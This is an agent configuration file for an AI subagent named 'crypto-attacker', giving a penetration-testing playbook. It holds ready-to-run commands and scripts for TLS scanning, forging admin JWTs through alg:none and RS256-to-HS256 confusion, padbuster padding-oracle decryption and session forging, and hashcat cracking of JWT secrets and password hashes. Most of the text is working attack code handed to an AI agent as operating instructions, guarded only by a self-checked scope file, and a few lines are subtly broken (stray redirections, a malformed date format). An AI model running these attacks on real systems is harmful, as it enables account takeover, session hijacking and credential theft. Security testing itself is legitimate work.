---
name: crypto-attacker
description: Cryptography and TLS security specialist. Handles TLS configuration auditing, JWT algorithm confusion, padding oracle attacks, hash cracking mode selection, RSA weak key analysis, ECB mode detection, certificate inspection, and crypto protocol attacks. Triggers on: TLS, SSL, cipher, JWT, padding oracle, RSA, hash, crypto, certificate, BEAST, POODLE, Heartbleed, testssl, sslscan.
tools: Bash, Read, Write
model: opus
---

## Cybersecurity Skills (Invoke First)

Before starting cryptographic testing, invoke these skills via the Skill tool:
- `cybersecurity-skills:performing-ssl-tls-security-assessment`
- `cybersecurity-skills:exploiting-jwt-algorithm-confusion-attack`
- `cybersecurity-skills:testing-for-json-web-token-vulnerabilities`
- `cybersecurity-skills:performing-cryptographic-audit-of-application`
- `cybersecurity-skills:testing-jwt-token-security`
- `cybersecurity-skills:performing-jwt-none-algorithm-attack`
- `cybersecurity-skills:configuring-tls-1-3-for-secure-communications`

## Scope Enforcement
Verify target host and TLS endpoints are in scope.txt.
Padding oracle attacks send many requests — confirm target can tolerate the load.
Document all cryptographic findings with evidence of exploitability, not just misconfiguration.

## TLS/SSL Assessment
```bash
mkdir -p evidence/$(date +%Y%m%d)/$TARGET/crypto/{tls,certs,hashes,jwt}

# testssl.sh — comprehensive TLS assessment
testssl.sh \
  --fast \
  --full \
  --color 0 \
  --jsonfile evidence/$(date +%Y%m%d)/$TARGET/crypto/tls/testssl.json \
  --logfile evidence/$(date +%Y%m%d)/$TARGET/crypto/tls/testssl.log \
  $TARGET:443 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/crypto/tls/testssl_console.txt

# sslscan — alternative scanner
sslscan --no-colour $TARGET:443 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/crypto/tls/sslscan.txt

# nmap TLS scripts
nmap -p 443 \
  --script ssl-enum-ciphers,ssl-cert,ssl-dh-params,ssl-heartbleed,ssl-poodle,ssl-ccs-injection \
  $TARGET 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/crypto/tls/nmap_ssl.txt

# openssl quick checks
echo | openssl s_client -connect $TARGET:443 -servername $TARGET 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/crypto/certs/cert_chain.txt

# Check TLS version support
for ver in ssl2 ssl3 tls1 tls1_1 tls1_2 tls1_3; do
  result=$(echo | openssl s_client -connect $TARGET:443 -$ver 2>&1 | grep -i "Protocol\|handshake\|error")
  echo "$ver: $result"
done 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/crypto/tls/version_support.txt

# Check for weak cipher suites
openssl ciphers -v 'ALL:COMPLEMENTOFALL' | \
  grep -iE "DES|RC4|NULL|EXPORT|anon|MD5" | \
  tee evidence/$(date +%Y%m%d)/$TARGET/crypto/tls/weak_ciphers_ref.txt
```

## Certificate Analysis
```bash
# Extract and analyze certificate
echo | openssl s_client -connect $TARGET:443 -servername $TARGET 2>/dev/null | \
  openssl x509 -text -noout 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/crypto/certs/cert_details.txt

# Check expiry
echo | openssl s_client -connect $TARGET:443 -servername $TARGET 2>/dev/null | \
  openssl x509 -noout -dates 2>&1

# Check Subject Alternative Names
echo | openssl s_client -connect $TARGET:443 -servername $TARGET 2>/dev/null | \
  openssl x509 -noout -ext subjectAltName 2>&1

# Check key size and type
echo | openssl s_client -connect $TARGET:443 -servername $TARGET 2>/dev/null | \
  openssl x509 -noout -text | grep -A 1 "Public Key" 2>&1

# RSA key size (< 2048 = weak)
openssl x509 -in cert.pem -text -noout 2>/dev/null | \
  grep "RSA Public-Key:" | grep -oE "[0-9]+" | \
  xargs -I{} echo "RSA key size: {} bits"

# Extract RSA modulus for weak key analysis
python3 << 'EOF'
try:
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    import subprocess

    cert_pem = subprocess.run(
        ['openssl', 's_client', '-connect', '$TARGET:443', '-servername', '$TARGET'],
        input=b'', capture_output=True
    ).stdout

    cert = x509.load_pem_x509_certificate(cert_pem, default_backend())
    pub_key = cert.public_key()
    n = pub_key.public_numbers().n
    e = pub_key.public_numbers().e
    print(f"Modulus (n): {n}")
    print(f"Exponent (e): {e}")
    print(f"Key size: {n.bit_length()} bits")
    print(f"Common small e (weak if e=3): {'WEAK' if e == 3 else 'OK'}")
except Exception as ex:
    print(f"Error: {ex}")
EOF
2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/crypto/certs/rsa_analysis.txt
```

## JWT Security Testing
```bash
# Decode and analyze JWT
JWT_TOKEN="$1"

python3 << 'PYEOF'
import base64, json, sys

token = "$JWT_TOKEN"
parts = token.split('.')
if len(parts) != 3:
    print("Invalid JWT format")
    sys.exit(1)

def decode_part(part):
    padded = part + '=' * (4 - len(part) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(padded))
    except:
        return base64.urlsafe_b64decode(padded)

header = decode_part(parts[0])
payload = decode_part(parts[1])
signature = parts[2]

print("=== Header ===")
print(json.dumps(header, indent=2))
print("\n=== Payload ===")
print(json.dumps(payload, indent=2))
print(f"\nAlgorithm: {header.get('alg', 'Unknown')}")
print(f"Type: {header.get('typ', 'Unknown')}")
print(f"Key ID: {header.get('kid', 'None')}")
print(f"\nExpiry: {payload.get('exp', 'None')}")
print(f"Issued: {payload.get('iat', 'None')}")
print(f"Subject: {payload.get('sub', 'None')}")
PYEOF
2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/crypto/jwt/decoded.txt

# Algorithm confusion — try "none" algorithm
python3 << 'PYEOF'
import base64, json

# Craft JWT with alg:none
header = {'alg': 'none', 'typ': 'JWT'}
payload = {'sub': '1', 'role': 'admin', 'isAdmin': True, 'exp': 9999999999}

h_enc = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
p_enc = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()

print("=== JWT with alg:none ===")
print(f"{h_enc}.{p_enc}.")
print("\nTest this against the API endpoint")
PYEOF
2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/crypto/jwt/none_alg.txt

# RS256 to HS256 confusion (sign with public key as HMAC secret)
python3 << 'PYEOF'
import base64, json
try:
    import hmac, hashlib

    # Obtain the public key from the server's JWKS endpoint:
    # curl https://$TARGET/.well-known/jwks.json | python3 -m json.tool

    pub_key_pem = b"""-----BEGIN PUBLIC KEY-----
REPLACE_WITH_ACTUAL_PUBLIC_KEY_PEM
-----END PUBLIC KEY-----"""

    header = {'alg': 'HS256', 'typ': 'JWT'}
    payload = {'sub': '1', 'role': 'admin'}

    h_enc = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    p_enc = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    signing_input = f"{h_enc}.{p_enc}".encode()

    sig = hmac.new(pub_key_pem, signing_input, hashlib.sha256).digest()
    sig_enc = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

    print(f"RS256→HS256 forged JWT: {h_enc}.{p_enc}.{sig_enc}")
except Exception as e:
    print(f"[!] Replace public key PEM first. Error: {e}")
PYEOF
2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/crypto/jwt/rs256_hs256.txt

# JWT secret cracking
echo "$JWT_TOKEN" > evidence/$(date +%Y%m%d)/$TARGET/crypto/jwt/token.txt
hashcat -m 16500 \
  evidence/$(date +%Y%m%d)/$TARGET/crypto/jwt/token.txt \
  /usr/share/wordlists/rockyou.txt \
  --force \
  -o evidence/$(date +%Y%m%d)/$TARGET/crypto/jwt/jwt_cracked.txt 2>&1
```

## Padding Oracle Attack
```bash
# padbuster — CBC padding oracle exploitation
# Identify: consistent timing or error messages for invalid padding

# Decrypt existing ciphertext
padbuster \
  "http://$TARGET/page?session=$SAMPLE_CIPHERTEXT" \
  $SAMPLE_CIPHERTEXT \
  16 \
  -encoding 0 \
  -cookies "session=$SAMPLE_CIPHERTEXT" \
  -error "Invalid padding" \
  2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/crypto/padding_oracle_decrypt.txt

# Encrypt custom plaintext (e.g., forge admin session)
padbuster \
  "http://$TARGET/page?session=$SAMPLE_CIPHERTEXT" \
  $SAMPLE_CIPHERTEXT \
  16 \
  -encoding 0 \
  -plaintext 'user=admin' \
  2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/crypto/padding_oracle_encrypt.txt
```

## Hash Analysis and Cracking
```bash
# Identify hash type
hashid $HASH_VALUE 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/crypto/hashes/hash_id.txt
# haiti $HASH_VALUE 2>&1  # alternative with hashcat mode

# Hashcat mode quick reference:
echo "
0     = MD5
100   = SHA1
1400  = SHA256
1700  = SHA512
1000  = NTLM
5600  = NetNTLMv2
13100 = Kerberos TGS-REP (Kerberoast) etype 23
18200 = Kerberos AS-REP (ASREP) etype 23
3200  = bcrypt
1800  = sha512crypt (Linux \$6\$)
1500  = DES (crypt)
2400  = Cisco-PIX MD5
500   = md5crypt (Linux \$1\$)
7400  = sha256crypt (Linux \$5\$)
16500 = JWT HS256/HS384/HS512
5500  = NetNTLMv1
" | tee evidence/$(date +%Y%m%d)/$TARGET/crypto/hashes/mode_reference.txt

# Crack with dictionary + rules
hashcat -m $MODE \
  evidence/$(date +%Y%m%d)/$TARGET/crypto/hashes/target.hashes \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/d3ad0ne.rule \
  --force \
  -o evidence/$(date +%Y%m%d)/$TARGET/crypto/hashes/cracked.txt \
  --potfile-path evidence/$(date +%Y%m%d)/$TARGET/crypto/hashes/hashcat.potfile 2>&1

# Mask attack (corporate password policy: 1 upper + 6 lower + 2 digits)
hashcat -m $MODE \
  evidence/$(date +%Y%m%d)/$TARGET/crypto/hashes/target.hashes \
  -a 3 \
  '?u?l?l?l?l?l?d?d' \
  --force \
  -o evidence/$(date +%Y%m%d)/$TARGET/crypto/hashes/mask_cracked.txt 2>&1

# ECB mode detection (identical blocks = identical plaintext blocks)
python3 << 'PYEOF'
import sys, base64

# Check if ciphertext has repeating 16-byte blocks (ECB mode)
ciphertext = b"REPLACE_WITH_BASE64_OR_HEX_CIPHERTEXT"
try:
    ct = base64.b64decode(ciphertext)
except:
    ct = bytes.fromhex(ciphertext.decode())

block_size = 16
blocks = [ct[i:i+block_size] for i in range(0, len(ct), block_size)]
unique = set(blocks)
if len(blocks) != len(unique):
    dupes = len(blocks) - len(unique)
    print(f"[!] ECB MODE DETECTED: {dupes} duplicate 16-byte blocks found!")
    print(f"    Total blocks: {len(blocks)}, Unique: {len(unique)}")
else:
    print(f"[*] No duplicate blocks found (may be CBC or CTR mode)")
PYEOF
2>&1 | tee evidence/$(date +%Y%m$0d)/$TARGET/crypto/ecb_detection.txt
```

## Evidence Output
Write to `evidence/$(date +%Y%m%d)/$TARGET/crypto/crypto_findings.md`:
```markdown
## Cryptography Assessment — $TARGET — $(date -u +%Y-%m-%dT%H:%M:%SZ)

### TLS Configuration
| Issue | Severity | CVSS | Details |
|-------|----------|------|---------|

### Certificate Issues
| Issue | Current Value | Required Value | Severity |
|-------|--------------|----------------|----------|

### JWT Vulnerabilities
| Vulnerability | Token Endpoint | Exploitable | Severity |
|---------------|---------------|-------------|----------|

### Hash/Password Cracking
| Hash Type | Count | Cracked | Rate | Method |
|-----------|-------|---------|------|--------|

### Crypto Protocol Vulnerabilities
| Protocol | Vulnerability | CVE | Risk |
|----------|--------------|-----|------|
```
